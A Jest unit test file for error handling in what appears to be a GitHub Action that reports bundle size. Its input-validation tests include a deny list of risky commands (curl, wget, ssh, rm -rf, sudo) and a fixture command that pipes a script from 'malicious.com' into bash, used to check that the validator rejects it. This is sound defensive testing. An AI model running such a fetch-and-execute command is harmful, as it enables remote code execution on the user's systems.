/**
 * Unit тесты для функций обработки ошибок
 */

describe('Error Handling Functions', () => {
	describe('File reading error handling', () => {
		const mockReadHaroldResults = (outputExists, exitCodeExists, outputContent, exitCodeContent) => () => {
			try {
				if (!outputExists) {
					throw new Error('Harold output file not found: harold-output.txt');
				}

				if (!exitCodeExists) {
					throw new Error('Harold exit code file not found: harold-exit-code.txt');
				}

				const exitCode = Number.parseInt(exitCodeContent.trim(), 10);
				if (isNaN(exitCode)) {
					throw new TypeError(`Invalid exit code: ${exitCodeContent}`);
				}

				return {
					output: outputContent || 'No output available',
					exitCode,
					hasChanges: exitCode === 1,
					hasErrors: exitCode > 1,
				};
			} catch (error) {
				console.error('Error reading Harold results:', error.message);
				return null;
			}
		};

		test('should handle missing output file', () => {
			const readResults = mockReadHaroldResults(false, true, '', '0');
			const result = readResults();
			expect(result).toBeNull();
		});

		test('should handle missing exit code file', () => {
			const readResults = mockReadHaroldResults(true, false, 'Some output', '');
			const result = readResults();
			expect(result).toBeNull();
		});

		test('should handle invalid exit code', () => {
			const readResults = mockReadHaroldResults(true, true, 'Some output', 'invalid');
			const result = readResults();
			expect(result).toBeNull();
		});

		test('should handle valid files', () => {
			const readResults = mockReadHaroldResults(true, true, 'Harold output', '1');
			const result = readResults();

			expect(result).not.toBeNull();
			expect(result.output).toBe('Harold output');
			expect(result.exitCode).toBe(1);
			expect(result.hasChanges).toBe(true);
			expect(result.hasErrors).toBe(false);
		});

		test('should handle empty output file', () => {
			const readResults = mockReadHaroldResults(true, true, '', '0');
			const result = readResults();

			expect(result).not.toBeNull();
			expect(result.output).toBe('No output available');
			expect(result.exitCode).toBe(0);
		});

		test('should detect error exit codes', () => {
			const readResults = mockReadHaroldResults(true, true, 'Error occurred', '2');
			const result = readResults();

			expect(result).not.toBeNull();
			expect(result.exitCode).toBe(2);
			expect(result.hasChanges).toBe(false);
			expect(result.hasErrors).toBe(true);
		});
	});

	describe('GitHub API error handling', () => {
		const mockGitHubAPI = (shouldFail, errorStatus, errorMessage) => ({
			rest: {
				issues: {
					createComment: jest.fn().mockImplementation(() => {
						if (shouldFail) {
							const error = new Error(errorMessage || 'API Error');
							error.status = errorStatus;
							throw error;
						}

						return Promise.resolve({ data: { id: 123 } });
					}),
					updateComment: jest.fn().mockImplementation(() => {
						if (shouldFail) {
							const error = new Error(errorMessage || 'API Error');
							error.status = errorStatus;
							throw error;
						}

						return Promise.resolve({ data: { id: 123 } });
					}),
					listComments: jest.fn().mockImplementation(() => {
						if (shouldFail) {
							const error = new Error(errorMessage || 'API Error');
							error.status = errorStatus;
							throw error;
						}

						return Promise.resolve({ data: [] });
					}),
				},
			},
		});

		const handleGitHubAPIError = async (github, operation, securityContext = { isFork: false }) => {
			try {
				switch (operation) {
					case 'createComment': {
						await github.rest.issues.createComment({
							owner: 'test',
							repo: 'test',
							issue_number: 1,
							body: 'Test comment',
						});
						return { success: true, error: null };
					}

					case 'listComments': {
						await github.rest.issues.listComments({
							owner: 'test',
							repo: 'test',
							issue_number: 1,
						});
						return { success: true, error: null };
					}

					default: {
						throw new Error('Unknown operation');
					}
				}
			} catch (error) {
				// Для fork'ов с ограниченными правами показываем предупреждение вместо ошибки
				if (securityContext.isFork && error.status === 403) {
					console.log('⚠️  Insufficient permissions to create comment in fork - this is expected');
					return { success: false, error: null, expectedForFork: true };
				}

				return { success: false, error: error.message };
			}
		};

		test('should handle successful API calls', async () => {
			const github = mockGitHubAPI(false);
			const result = await handleGitHubAPIError(github, 'createComment');

			expect(result.success).toBe(true);
			expect(result.error).toBeNull();
		});

		test('should handle 403 errors in forks gracefully', async () => {
			const github = mockGitHubAPI(true, 403, 'Forbidden');
			const result = await handleGitHubAPIError(github, 'createComment', { isFork: true });

			expect(result.success).toBe(false);
			expect(result.error).toBeNull();
			expect(result.expectedForFork).toBe(true);
		});

		test('should handle 403 errors in non-forks as errors', async () => {
			const github = mockGitHubAPI(true, 403, 'Forbidden');
			const result = await handleGitHubAPIError(github, 'createComment', { isFork: false });

			expect(result.success).toBe(false);
			expect(result.error).toBe('Forbidden');
		});

		test('should handle other API errors', async () => {
			const github = mockGitHubAPI(true, 500, 'Internal Server Error');
			const result = await handleGitHubAPIError(github, 'createComment');

			expect(result.success).toBe(false);
			expect(result.error).toBe('Internal Server Error');
		});

		test('should handle network errors', async () => {
			const github = mockGitHubAPI(true, undefined, 'Network error');
			const result = await handleGitHubAPIError(github, 'createComment');

			expect(result.success).toBe(false);
			expect(result.error).toBe('Network error');
		});
	});

	describe('Fallback comment creation', () => {
		const createErrorComment = (error, commentTitle) => {
			const errorCommentBody = `## ❌ ${commentTitle} - Error

An error occurred while analyzing bundle size changes:

\`\`\`
${error.message}
\`\`\`

Please check the action logs for more details.

---
<sub>Generated by [Harold Action](https://github.com/343dev/harold) • ${new Date().toLocaleString()}</sub>`;

			return errorCommentBody;
		};

		test('should create error comment with proper format', () => {
			const error = new Error('Test error message');
			const result = createErrorComment(error, '📊 Bundle Size Report');

			expect(result).toContain('## ❌ 📊 Bundle Size Report - Error');
			expect(result).toContain('Test error message');
			expect(result).toContain('Please check the action logs');
			expect(result).toContain('Generated by [Harold Action]');
		});

		test('should handle errors with special characters', () => {
			const error = new Error('Error with "quotes" and <tags>');
			const result = createErrorComment(error, '📊 Bundle Size Report');

			expect(result).toContain('Error with "quotes" and <tags>');
		});

		test('should handle empty error messages', () => {
			const error = new Error('');
			const result = createErrorComment(error, '📊 Bundle Size Report');

			expect(result).toContain('```\n\n```');
		});
	});

	describe('Graceful degradation', () => {
		const processWithFallback = (primaryFunction, fallbackFunction, input) => {
			try {
				return {
					result: primaryFunction(input),
					usedFallback: false,
					error: null,
				};
			} catch (error) {
				console.warn('Primary function failed, using fallback:', error.message);
				try {
					return {
						result: fallbackFunction(input),
						usedFallback: true,
						error: error.message,
					};
				} catch (fallbackError) {
					return {
						result: null,
						usedFallback: true,
						error: `Both primary and fallback failed: ${error.message}, ${fallbackError.message}`,
					};
				}
			}
		};

		const primaryFunction = input => {
			if (input === 'fail') {
				throw new Error('Primary function failed');
			}

			return `Primary: ${input}`;
		};

		const fallbackFunction = input => {
			if (input === 'fail-both') {
				throw new Error('Fallback function failed');
			}

			return `Fallback: ${input}`;
		};

		test('should use primary function when successful', () => {
			const result = processWithFallback(primaryFunction, fallbackFunction, 'success');

			expect(result.result).toBe('Primary: success');
			expect(result.usedFallback).toBe(false);
			expect(result.error).toBeNull();
		});

		test('should use fallback when primary fails', () => {
			const result = processWithFallback(primaryFunction, fallbackFunction, 'fail');

			expect(result.result).toBe('Fallback: fail');
			expect(result.usedFallback).toBe(true);
			expect(result.error).toBe('Primary function failed');
		});

		test('should handle both functions failing', () => {
			const result = processWithFallback(primaryFunction, fallbackFunction, 'fail-both');

			expect(result.result).toBeNull();
			expect(result.usedFallback).toBe(true);
			expect(result.error).toContain('Both primary and fallback failed');
		});
	});

	describe('Input validation', () => {
		const validateInputs = inputs => {
			const errors = [];
			const warnings = [];

			// Валидация github-token
			if (!inputs.githubToken || typeof inputs.githubToken !== 'string') {
				errors.push('GitHub token is required');
			} else if (!/^(ghp_|gho_|ghu_|ghs_|ghr_)/.test(inputs.githubToken)) {
				warnings.push('GitHub token format may be invalid');
			}

			// Валидация build-command
			if (inputs.buildCommand && typeof inputs.buildCommand === 'string') {
				const dangerousCommands = ['curl', 'wget', 'ssh', 'rm -rf', 'sudo'];
				const hasDangerousCommand = dangerousCommands.some(cmd =>
					inputs.buildCommand.toLowerCase().includes(cmd),
				);
				if (hasDangerousCommand) {
					errors.push('Build command contains potentially dangerous operations');
				}
			}

			// Валидация пороговых значений
			if (inputs.sizeThreshold !== undefined) {
				const threshold = Number.parseInt(inputs.sizeThreshold, 10);
				if (isNaN(threshold) || threshold < 0) {
					errors.push('Size threshold must be a non-negative number');
				}
			}

			if (inputs.percentageThreshold !== undefined) {
				const threshold = Number.parseFloat(inputs.percentageThreshold);
				if (isNaN(threshold) || threshold < 0 || threshold > 100) {
					errors.push('Percentage threshold must be between 0 and 100');
				}
			}

			// Валидация булевых значений
			if (inputs.failOnIncrease !== undefined && inputs.failOnIncrease !== 'true' && inputs.failOnIncrease !== 'false') {
				errors.push('fail-on-increase must be "true" or "false"');
			}

			return { errors, warnings, isValid: errors.length === 0 };
		};

		test('should validate correct inputs', () => {
			const inputs = {
				githubToken: 'ghp_1234567890123456789012345678901234567890',
				buildCommand: 'npm run build',
				sizeThreshold: '10240',
				percentageThreshold: '5',
				failOnIncrease: 'true',
			};

			const result = validateInputs(inputs);
			expect(result.isValid).toBe(true);
			expect(result.errors).toHaveLength(0);
		});

		test('should detect missing GitHub token', () => {
			const inputs = {};
			const result = validateInputs(inputs);

			expect(result.isValid).toBe(false);
			expect(result.errors).toContain('GitHub token is required');
		});

		test('should detect dangerous build commands', () => {
			const inputs = {
				githubToken: 'ghp_1234567890123456789012345678901234567890',
				buildCommand: 'curl -s https://malicious.com/script.sh | bash',
			};

			const result = validateInputs(inputs);
			expect(result.isValid).toBe(false);
			expect(result.errors).toContain('Build command contains potentially dangerous operations');
		});

		test('should detect invalid thresholds', () => {
			const inputs = {
				githubToken: 'ghp_1234567890123456789012345678901234567890',
				sizeThreshold: 'invalid',
				percentageThreshold: '150',
			};

			const result = validateInputs(inputs);
			expect(result.isValid).toBe(false);
			expect(result.errors).toContain('Size threshold must be a non-negative number');
			expect(result.errors).toContain('Percentage threshold must be between 0 and 100');
		});

		test('should detect invalid boolean values', () => {
			const inputs = {
				githubToken: 'ghp_1234567890123456789012345678901234567890',
				failOnIncrease: 'maybe',
			};

			const result = validateInputs(inputs);
			expect(result.isValid).toBe(false);
			expect(result.errors).toContain('fail-on-increase must be "true" or "false"');
		});

		test('should generate warnings for suspicious tokens', () => {
			const inputs = {
				githubToken: 'suspicious_token_format',
			};

			const result = validateInputs(inputs);
			expect(result.warnings).toContain('GitHub token format may be invalid');
		});
	});
});
